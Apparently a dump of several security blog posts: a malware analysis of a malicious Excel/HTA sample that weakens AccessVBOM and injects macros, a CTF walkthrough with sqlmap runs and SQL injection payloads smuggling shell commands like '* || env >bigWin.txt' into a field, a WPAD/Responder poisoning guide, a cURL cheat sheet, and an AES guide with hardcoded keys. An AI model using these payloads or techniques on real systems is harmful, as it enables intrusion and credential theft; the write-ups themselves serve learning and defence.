So we tested on a **Windows 7** Machine, after opening the file, the exploit imediately startet to run:\n\n![excel-file-report](/htb/obfuscation/file-report.png)\n\n> 1. At first a temp file was created under `C:\\Users\\admin\\AppData\\Local\\Temp\\CVR40EB.tmp.cvr`\n> 2. Then a what seems to be `visual basic script` executer was added here: `C:\\Users\\admin\\AppData\\Local\\Temp\\VBE\\MSForms.exd`\n> 3. followed by a `.hta` file with a funny name..: `C:\\Users\\admin\\AppData\\Local\\Temp\\LwTHLrGh.hta` <-- lemme guess thats the one.\n> 4. it then makes use of `mshta.exe` to try and execute the `LwTHLrGh.hta` file.\n> 5. then ANY.RUN stops executing the file.\n\n![important files](/htb/obfuscation/file-modifications.png)\n\nI went ahead and _downloaded_ the `MSForms.exd` as well as the `LwTHLrGh.hta` file so we can analyze them further.\n\n## Analyzing `LwTHLrGh.hta`\n\n> .hta is a propriatary file format used by microsoft, its called '**HT**ML **A**pplication' and supports HTML code as well as **Visual Basic** or **JScript**. This format was meant to be used by Internet Explorer.\n>\n> The **default file-association** for the .hta extension is the Microsoft HTML Application Host (**mshta.exe**). If you have not disabled or changed this file association, in effect the HTA file behaves like an executable when double-clicked. An **HTA runs** as a **fully trusted application** and as a result has a lot **more privileges than a normal HTML** file.\n\nSounds dangerous, nice!\n\nSo lets disect this bitch!\n\nWhen opening the file we see it has a rather clear structure, a huge VB Script and **even comments**. How nice of the hacker not to obfuscate his code too much, thanks [@0xdf](https://twitter.com/0xdf_). ;-)\n\n```jsx\n\"<html><head>\n\n<script language=\"vbscript\">\n\n<!-- VB script here -->\n\n</script></head></html>\"\n```\n\nso naturally, since its practiacally all the code, we strip the vbcode out of the .hta to make it readable.\n\nThank god we know VB, otherwise this would be a pain from here on now. ;-) Thankfully, since the autor has left some comments, indicating how the attack works, we should be able to cope with it.\n\nThe very first thing he does is effectively creating a backup of the AccessVBOM key **if** it has been set before.\n\n```vb\n' Get the old AccessVBOM value\nRegPath = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" & objExcel.Version & \"\\Excel\\Security\\AccessVBOM\"\n\nif RegExists(RegPath) then\n        action = WshShell.RegRead(RegPath)\nelse\n        action = \"\"\"\"\nend if\n```\n\n> \"_Setting AccessVBOM to 1 allows to access the VBA Object Model_\"\n\nThen he 'weakens the target' by setting the AccessVBOM to 1, thus enabling all acces to VBA Object Model.\n\n```VB\n' Weaken the target\nWshShell.RegWrite RegPath, 1, \"REG_DWORD\"\n```\n\nThen he gets to the juicy part.\nTo Exploit the Security setting he just turned off, he creates a new Excel Workboo, with macros of course.\nHe then proceeds to add VBComponents to the Excel, allowing him to add an Assembly Code Module.\n\n```VB\n' Run the macro\nSet objWorkbook = objExcel.Workbooks.Add()\nSet xlmodule = objWorkbook.VBProject.VBComponents.Add(1)\nxlmodule.CodeModule.AddFromString ... 80 more lines...\n\n```\n\nIn his last step this good boy restores the systems registry to its previous state.\n\n```vb\n' Restore the registry to its old state\nif action = \"\" then\n        WshShell.RegDelete RegPath\nelse\n        WshShell.RegWrite RegPath, action, \"REG_DWORD\"\nend if\nself.close\n```\n\n> xlmodule.CodeModule.AddFromString contains many obfuscated lines of assembly code, I deobfuscated it by printing it via VBS.\n\nHere is the actualy assembly code

We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\" -f --os=linux --dbms=mysql --level=3 -o\n```\n\nwe dont really get any more useful information from here.\nsoo.. were kinda stuck lets just get another hint then:\n\n> Hint 2: _Take a few minutes to consider the **state of the union**_\n\nThe state uf the union? are they hinting on using UNION statements in the query?\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\n\n`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`\n\nbut what do we look for? Lets get another hint.\n\n> Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\n\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\n\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\n\n> uWSGI can be configured using several different methods.\n\nYAML, JSON, INI are some supported formats -> ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\n\n![union select wiht burp repeater](/hackerone/union-select-ini.png \"union select wiht burp repeater\")\n\nthis returns us some configdata pointing to module main which is the entrypoint.\n\n```python\n[uwsgi]\nmodule = main\ncallable = app\n```\n\nso lets see if we can also fethc the main.py\n\n```python\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\n```\n\nHere we get lots of infos our **first FLAG** and the db connection settings:\n\n### FLAG 0:\n\n```python\n%s\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1] + '' rep += '\n\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80)\n```\n\n`return MySQLdb.connect(host=\"localhost\", user=\"root\", password=\"\", db=\"level5\")`\n\nwe also see that they are using the photos table\n\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\n\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=1\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\n```\n\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\n\n```python\nsqlmap -u \"http://35.190.155.168/c947e97f6e/fetch?id=3\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\n```\n\nThis means that sqlmap will start with the filename of id=3 which is exactly what we want right now.\n\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \"query on the filename of id 3\")\nSo lets have a look at our results:\n\n```python\nDatabase: level5\nTable: photos\n[3 entries]\n+------------------------------------------------------------------+\n| filename |\n+------------------------------------------------------------------+\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\n| files/adorable.jpg |\n| files/purrfect.jpg |\n+------------------------------------------------------------------+\n```\n\n> you might be getting partial values like so:\n> `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\n> you should be able to re-run sqlmap to find the missing characters\n> `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\n\ndecrypted: `\\*||+ls+-a+tmp.txt`\nanother file! nice lets try and get that with a UNION STATEMENT request like so:\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`\nhmm no luck it seems... let's do it another way.\n\nFrom our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.\n\nWe want to run following statements via the vulnerable param:\n\n#### ls in the /files directory and store data in bigWin.txt\n\n`update photos set filename='* || ls ./files >bigWin.txt ' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\n\n#### store all env data in bigWin.txt (because so often flags are here)\n\n`update photos set filename='* || env >bigWin.txt' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`\n\nafter you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`\n\nTadaa!! we got it all.\n\n```bash\n\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\"\n\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\"\nHOSTNAME=ad3e8c7df92d\nSHLVL=0\n```\n"},{"path":"blog/basic-cURL-cheatsheet-lwlx","title":"the cURL cheat sheet","subtitle":null,"published":true,"datePublished":1609416432536,"tags":["cheatsheet","commandline","curl","security"],"description":"you need.","canonicalUrl":"https://dev.lwlx.xyz/blog/basic-cURL-cheatsheet-lwlx","author":"lwlx","authorPhoto":"/profile.jpg","authorTwitter":"0x0000005","bannerPhoto":"/default.jpg","thumbnailPhoto":"/default-thumb.jpg","content":"\n# cURL What is it?\n\ncURL describes itself as:\n\n> command line tool and library for transferring data with URLs\n\ncURL is a multipurpose networking tool which has lots of useful usecases.\n\n# cheat sheet\n\n<table>\n<thead>\n<tr>\n<th><strong>Command</strong></th>\n<th><strong>Description</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>curl http://lwlx.xyz</code></td>\n<td>GET request with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl http://lwlx.xyz -v</code></td>\n<td>Verbose GET request with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl http://admin:password@lwlx.xyz/ -vvv</code></td>\n<td><code>cURL</code> Basic Auth login</td>\n</tr>\n<tr>\n<td><code>curl -u admin:password http://lwlx.xyz/ -vvv</code></td>\n<td>Alternate <code>cURL</code> Basic Auth login</td>\n</tr>\n<tr>\n<td><code>curl -u admin:password -L http://lwlx.xyz/</code></td>\n<td><code>cURL</code> Basic Auth login, follow redirection</td>\n</tr>\n<tr>\n<td><code>curl -u admin:password 'http://lwlx.xyz/search.php?port_code=us'</code></td>\n<td><code>cURL</code> GET request with parameter</td>\n</tr>\n<tr>\n<td><code>curl -d 'username=user&amp;password=pass' -L http://lwlx.xyz/login.php</code></td>\n<td>POST request with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl -d 'username=user&amp;password=pass' -L http://lwlx.xyz/login.php -v</code></td>\n<td>Debugging with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl -d 'username=user&amp;password=pass' -L --cookie-jar /dev/null http://lwlx.xyz/login.php -v</code></td>\n<td>Cookie usage with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl -d 'username=user&amp;password=pass' -L --cookie-jar cookies.txt http://lwlx.xyz/login.php</code></td>\n<td><code>cURL</code> with cookie file</td>\n</tr>\n<tr>\n<td><code>curl -H 'Content-Type: application/json' -d '{ \"username\" : \"user\", \"password\" : \"pass\" }'</code></td>\n<td><code>cURL</code> specify content type</td>\n</tr>\n<tr>\n<td><code>curl -X OPTIONS http://lwlx.xyz/ -vv</code></td>\n<td><code>cURL</code> OPTIONS request</td>\n</tr>\n<tr>\n<td><code>curl -X PUT -d @test.txt http://lwlx.xyz/test.txt -vv</code></td>\n<td>File upload with <code>cURL</code></td>\n</tr>\n<tr>\n<td><code>curl -X DELETE http://lwlx.xyz/test.txt -vv</code></td>\n<td>DELETE method with <code>cURL</code></td>\n</tr>\n</tbody>\n</table>\n"},{"path":"blog/abuse-WPAD-protocol-to-MitM-any-network","title":"MitM using WPAD Proxy Protocol:","subtitle":"Getting a reverse shell on windows client","published":true,"datePublished":1605702028864,"tags":["MitM","WPAD","aPAColypse","PAC","exploit","security"],"description":"When a decision made 25+ years ago makes your computer vulnerable to the stupidest attack you've heard of.","canonicalUrl":"https://dev.lwlx.xyz/blog/abuse-WPAD-protocol-to-MitM-any-network","author":"lwlx","authorPhoto":"/profile.jpg","authorTwitter":"0x0000005","bannerPhoto":"/wpad-responder-exploit/wpad_post_img.jpg","thumbnailPhoto":"/wpad-responder-exploit/wpad_thumb.jpg","content":"\n# What is WPAD? `[WIP]`\n\nSometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.\n\nPAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.\n\n## WPAD always follows this schema:\n\n1. Determine if the system should use WPAD, either by looking at browser settings or asking the host OS if the browser is set to match the OS setting.\n2. Ensure a network connection is available.\n3. If WPAD is to be used, issue a DHCPINFORM query to ask for the URL of the PAC script.\n4. If the DHCPINFORM query fails and does not return a URL, perform a DNS lookup for the hostname `wpad`.\n5. If the DNS lookup succeeds, then the PAC URL is `http://wpad/wpad.dat`.\n6. Establish an HTTP(S) connection to the discovered URL's server, thus downloading the PAC script.\n7. If the PAC script has downloaded successfully, parse it, and optionally compile it.\n8. For each network request, call the `FindProxyForURL()` function in the PAC script and use the proxy settings returned from this function.\n\n> WPAD is practically asking the network \"Hey there! would you like to send me a **payload** i can **execute**?\"\n\nYou can clearly see how a bad actor can abuse this.\n\nWindows is certainly not the only piece of software that implements WPAD. Other operating systems (OS X, Linux) and applications do as well. For example, Google Chrome also has a WPAD implementation, but in Chrome's case, the JavaScript code from the PAC is evaluated inside of a sandbox. Other operating systems that support WPAD don't enable it by default anymore. That is why Windows is currently the most attractive target for this sort of attack.\n\n## Exploit basis\n\nWhen a device has these protocols enabled, if the local network DNS cannot resolve the name, the machine will ask the whole network to get a host. So, any host of the network, who knows its IP, can reply. Even if a host replies with incorrect information, it will still be regarded as a legitimate response.\n\n# Exploitable scenario\n\n1. victim and host are in the same network\n2. The victim opens the browser, which is configured with the option `automatically detect settings` in `Local Area Network (LAN) Settings`.\n3. The name resolution, which is performed with the steps we mentioned earlier, will be questioned on the victim's computer first.\n4. In step 3, because the DNS Server does not have a corresponding record, the system's name is sent as LLMNR or NetBIOS-NS query.\n5. The attacker listens to network traffic, catches name resolution query. It tells to the victim that he has the wpad.dat the victim is look for.\n\nAccording to the flow above, if an attacker wants to make sure that the attack will be successful, he must perform the following attacks:\n\n- DHCP poisoning attack\n- DNS poisoning attack\n- WPAD poisoning attack\n\n<!--\n# proof of concept\n\n## install Responder\n\n## configure config\n-->\n\n## start analyzing first\n\nusing the `-A` option enables analyze only mode\n**macOS:**\n\n```shell\n./Responder.py -i <your ip address> -A\n```\n\n**Linux:**\n\n```shell\n./Responder.py -I <your net interface> -A\n```\n\n## create payload adn custom FindProxyForURL()\n\n## run the attack:\n\n- `-w`: starts WPAD service\n- `-f`: fingerprints victims\n- `-v`: verbose output\n- `-F`: force auth to WPAD service\n\n```shell\n ./Responder.py -i 192.168.1.215 -w -f -v -F\n```\n\nforce basic auth to try and gain user & pass\n\n- `-b`: force Basic HTTP authentication\n\n```shell\n ./Responder.py -i 192.168.1.215 -w -f -v -b -F\n```\n\n![Succsessfull WPAD attack](/wpad-responder-exploit/responder-intercepted.png \"Succsessfull WPAD attack, planting a reverse shell on the victim.\")\n\n# Mitigation\n\n- Create a DNS entry called \"WPAD\" that points to the real proxy server.\n- Disabling automatic proxy discovery in browsers and operating systems.\n- Configure firewalls and proxies to block and log outbound requests for wpad.dat files.\n\n> ## `[WIP]` This article is a work in progress and will be updated with a proof of concept soon.\n\n<!--\n## Read more about this topic:\n\n[https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html](https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html)\n-->\n"},{"path":"blog/consistent-x-device-encryption-in-javascript","title":"Getting consistent Encryption in Node / PHP / Browser and openSSL","subtitle":null,"published":true,"datePublished":1603967203286,"tags":["encryption","decryption","openssl","nodejs","php"],"description":"Cryptography is hard, and because it's already hard enough, here is a nice guide on the AES Cipher in different environments.","canonicalUrl":"https://dev.lwlx.xyz/blog/consistent-x-device-encryption-in-javascript","author":"lwlx","authorPhoto":"/profile.jpg","authorTwitter":"0x0000005","bannerPhoto":"/crypto.jpg","thumbnailPhoto":"/crypto_thumb.jpg","content":"\nI recently was tasked to find a solution for encrypting data in different places and to being able to decrypt them all in a browser during runtime.\n\nSurprisingly, it was much more challenging than expected since there was so little documentation around this online. What was available were a few code-only examples, so I was forced to do R & D and try all implementations and compare the in- & outputs.\n\nGiven the lack of a decent out-of-the-box solution, I worry that many developers are settling for easy to use, insecure solutions that limit your project’s security and flexibility. Security should be easy to use and accessible.\n\n> Clone the repo here to get started with this setup: <a href=\"https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a\">https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a</a>\n\nOkay, so lets assume we use following input data to test each implementation:\n\n- **`key`** = '5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9' ` //must be 256 bits`\n- **`iv`** = '1d6ef201e0e7a9019ddf8414034325e2' ` //must be 128 bits`\n- **`inputData`** = `{\"TestData\":\"w17h Spé^cIäl chàær§¢tèrs\", \"OK\":\"://seems/fine?x=lol\"}`\n\nLet's quickly run through and test each implementation:\n\n## Using Node JS Crypto module\n\nNode Provides a nice `crypto` implementation. It's documentation is rather sparse, but this is what most resources suggest by using:\n\n- `crypto.randomBytes()`\n- `crypto.createCipheriv()`\n- `crypto.createDecipheriv()`\n\n```javascript\nconst crypto = require('crypto')\n\n/**********************************************************************\n*\n*        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *\n*\n***********************************************************************/\n\nconst encryption = (data = 'TestString {} Héllöüä') => {\n\n   const secretPhrase = crypto.randomBytes(16).toString('hex')\n   const salt = crypto.randomBytes(128 / 8).toString('hex')\n   //here we generate the key and give it back as a string, we use 100k iterations\n   //as suggested in best practices\n   //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use\n   //the same initialization vector twice\n   //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters\n   const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256').toString('hex').substr(0, 32)\n   //create unique IV for each encryption, the key can be reused.

This is likely because of the conversion from hex to string after the creation of the key.\n\n- **`key`** = '5035ae3567f2e69320b083d59a7364cf' ` //is now 32 bytes string`\n- **`iv`** = '1d6ef201e0e7a901' ` //is now 16 bytes string`\n\nThis will probably lead to an issue later on since other implementations actually want the longer strings. Maybe we can find a workaround by base64 encoding instead of stringifying the key and iv.\n\na quick test reveals, yes, we actually can:\n\n```\nconst IV = crypto.randomBytes(16)\n\nconsole.log(IV)\n// <Buffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7>\n\nconsole.log(IV.toString('base64'))\n// wR6YhFTrhfaz0FGH0mKApw==\n\nconsole.log(Buffer.from(IV.toString('base64'), 'base64'))\n//<Buffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7>\n```\n\nnow we could also just create a buffer again from the string to make it 16/32 bytes (ready for usage):\n\n```\nBuffer.from('5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9', 'hex')\n//<Buffer 50 35 ae 35 67 f2 e6 93 20 b0 83 d5 9a 73 64 cf 8d 4b 14 e7 7d 7b 79 80 51 24 1c e5 46 b3 27 d9>\n\nBuffer.from('1d6ef201e0e7a9019ddf8414034325e2','hex'))\n//<Buffer 1d 6e f2 01 e0 e7 a9 01 9d df 84 14 03 43 25 e2>\n```\n\nThis seems to be a nice solution when you **receive** the key and iv as an input; if we generate it ourselves, however, it better to just avoid the conversion to string after generation that many people use in examples:\n\n```\n// type Buffer, 16 bytes\nconst IV = crypto.randomBytes(16)\n\n// type Buffer, 32 bytes\nconst configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256')\n\n```\n\nThis key and IV pair can be consumed directly by our ciphers, but we would need to convert it to a hex string first to save and forward them.\n\n### So what is the output of this function?\n\nThe output we received is of type buffer, but when we convert it to a string using `toString('hex')` we can read the data:\n\n- **`OUTPUT`** = '<Buffer f2 fb 62 b1 7e e9 da 0c 8c bd 56 f2 45 a9 87 60 b4 e2 a6 d0 c5 de f1 50 bc 6d 86 00 f8 5d b4 79>' ` //is 32 bytes`\n- **`OUTPUT_Stringified`** = 'f2fb62b17ee9da0c8cbd56f245a98760b4e2a6d0c5def150bc6d8600f85db479' ` //is now 64 bytes string`\n- **`OUTPUT_Base64`** = '8vtisX7p2gyMvVbyRamHYLTiptDF3vFQvG2GAPhdtHk=' ` //is now 44 bytes string`\n\nso using the codes below, we can switch between these three outputs as we like\n\n```javascript\n//output Buffer\nencrypted = Buffer.concat([encrypted, Cipher.final()]);\n\n//output String\nencrypted = Buffer.concat([encrypted, Cipher.final()]).toString(\"hex\");\n\n//output Base64\nencrypted = Buffer.concat([encrypted, Cipher.final()]).toString(\"base64\");\n\n//revert conversion to base64\nBuffer.from(encrypted.toString(\"base64\"), \"base64\");\n```\n\nFrom what we have learned here, I guess the best option is to use the base64 output method since we can easily convert it to a buffer\n\n## Using browserify-aes's node crypto-like implementation inside the Browser\n\nInside the browser, we cannot use Nodes.js built-in modules. Using `browserify-aes` we can use a node-like crypto implementation, which uses the same syntax as the node implementation. In my use case, I only need to decipher in the browser, this means I don’t have to worry about a truly random key generation or ciphering.\n\n```js\nimport crypto from \"browserify-aes\";\n\n/**********************************************************************\n *\n *        DECRYPTION MODULE FOR USE IN BROWSER DURING RUNTIME          *\n *\n ***********************************************************************/\nconst decrypt = (Base64Hash) => {\n  //we use the base64 hash generated by openssl cli as an input\n  const Base64Hash =\n    \"Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg=\";\n  const Key =\n    \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\";\n  const IV = \"1d6ef201e0e7a9019ddf8414034325e2\";\n  const hexToBin = (hex) => {\n    //converts hex strings to binary arr\n    for (var bytes = [], c = 0; c < hex.length; c += 2) {\n      bytes.push(parseInt(hex.substr(c, 2), 16));\n    }\n    return bytes;\n  };\n  //ein neuer cipher wird vorbereitet, mittels aes256, unserem 256 bit KEY und dem config IV\n  const decipher = crypto.createDecipheriv(\n    \"aes256\",\n    hexToBin(Key),\n    hexToBin(IV)\n  );\n\n  //der hash wird nun decrypted mittels dem zuvor erstellten cipher\n  const decrypted = Buffer.concat([\n    decipher.update(Buffer.from(Base64Hash, \"base64\")),\n    decipher.final(),\n  ]).toString(\"utf8\");\n\n  return JSON.parse(decrypted);\n};\n```\n\n- **`OUTPUT`** = {TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\"} ` //yes, thats our original input! :D`\n\n## ENCRYPTION & DECRYPTION MODULE FOR PHP7+ USING OPENSSL\n\nIn PHP 7 we make use of the `openssl_encrypt` implementation to encrypt an utf8 string and finally encode it with `base64_encode`.\nFor decryption we also make use of the official openssl implementation `openssl_decrypt`, before decrypting we need to decode using `base64_decode`.\n\n```php\n/**********************************************************************\n*\n*        ENCRYPTION & DECRYPTION MODULE FOR PHP7+ USING OPENSSL       *\n*\n***********************************************************************/\n\nclass AESEncryption {\n\n   //key length should be 256 bits for aes 256 this means we use a string with 32 bytes\n   public static $key = \"5f08e0ec585393a8e2ca8f0a1a0ae752\";\n\n    //iv length should be always be 128 bit / 16 bytes\n   public static $iv = \"05d387e7f773035a\";\n\n    // The AES uses a block size of sixteen octets (128 bits)\n   public static $Method = 'AES-256-CBC';\n\n   /**\n     * use the AES to encrypt plaintext data and return a base 64 string\n    *\n    * $key\n    */\n   public static function encrypt($cleartext,$key = ''){\n\n       $key = empty($key) ? self::$key : $key;\n\n       $encrypted = openssl_encrypt($cleartext, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);\n\n       return base64_encode($encrypted);\n\n   }\n\n   /**\n     * use the AES to decrypt a base 64 string into plaintext\n    *\n    * $key\n    */\n   public static function decrypt($encrypted,$key = ''){\n\n       $key = empty($key) ? self::$key : $key;\n\n       $encrypted = base64_decode($encrypted);\n\n       $decrypted = openssl_decrypt($encrypted, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);\n\n       return trim($decrypted);\n   }\n}\n```\n\n> while desperately searching for a solution I looked into doing the encryption in PHP instead of openssl, since I scrapped this idea I cannot explain any further. I still keep this PHP 7 example here because its hard to find examples online that don’t use mcrypt.\n\n## Using OpenSSL for use in CLI\n\nInside of a Command Line Interface, we use `openssl` do en- or decrypt data.\n\nFor node/browserify to be able to decrypt it we need to add the `-nosalt` option, which disables salting the data.\n\n```bash\n#########################################################################################\n#                                                                                       #\n#               ENCRYPTION FOR CLI IN / MACOS / LINUX / WINDOWS                         #\n#                                                                                       #\n#########################################################################################\n\n#encrypt with key & IV but no salt\ncat config.json | openssl aes-256-cbc -iv $(cat iv)  -K $(cat key) -A -nosalt -base64\n\n#decrypt with key IV and base64\necho \"encryptedString\" | openssl aes-256-cbc -d -iv $(cat iv)  -K $(cat key) -base64 -A\n```\n\n### testing the implementation\n\nI created a json file called `test.json` containing the inputData. so when we run the following command ...\n\n```bash\ncat test.json | openssl aes-256-cbc -iv \"1d6ef201e0e7a9019ddf8414034325e2\"  -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -nosalt\n```\n\nWe get no warnings and an output like this:\n\n- **`OUTPUT`** = g??.G?٪a?W????ԝFv?? 0P0+v?'???R=CR??a? ?5!??N?\"?e?q?M{C\\??:u-?wH?? ` //weird looking binary data`\n\nas you can see this is not very usefull so we apply the base64 encoding after encryption\n\n```bash\ncat test.json | openssl aes-256-cbc -iv \"1d6ef201e0e7a9019ddf8414034325e2\"  -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -nosalt -base64\n```\n\n- **`OUTPUT_base64`** = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg= ` //now this looks nice`\n\nnow we can also decrypt the just created data like so\n\n```bash\necho $encryptedData | openssl aes-256-cbc -d -iv \"1d6ef201e0e7a9019ddf8414034325e2\" -K \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\" -A -base64\n```\n\nThis yields us this output\n\n- **`OUTPUT`** = {\"TestData\":\"w17h Spé^cIäl chàær§¢tèrs\", \"OK\":\"://seems/fine?x=lol\"} ` //yes, thats our original input! :)`\n\n# final solution\n\n## Using NodeJS during initial build\n\nWhile building our app this code is responsible for:\n\n- creating a unique `key` on every build\n- creating a unique `iv` for every object to be encrypted\n- outputting an encrypted base64 encoded string of data\n\nthe output needs to be consumed by either:\n\n- the application during runtime (browserify implementation)\n- openssl in case of deployment\n\n```javascript\nconst crypto = require(\"crypto\");\n\n/**********************************************************************\n *\n *        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *\n *\n ***********************************************************************/\n\nconst encryption = (\n  data = { TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\" }\n) => {\n  const secretPhrase = crypto.randomBytes(16).toString(\"hex\");\n  const salt = crypto.randomBytes(128 / 8).toString(\"hex\");\n  //here we generate the key and give it back as a string, we use 100k iterations\n  //as suggested in best practices\n  //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use\n  //the same initialization vector twice\n  //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters it is currently of type Buffer\n  const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, \"sha256\");\n  //create unique IV for each encryption, the key can be reused.
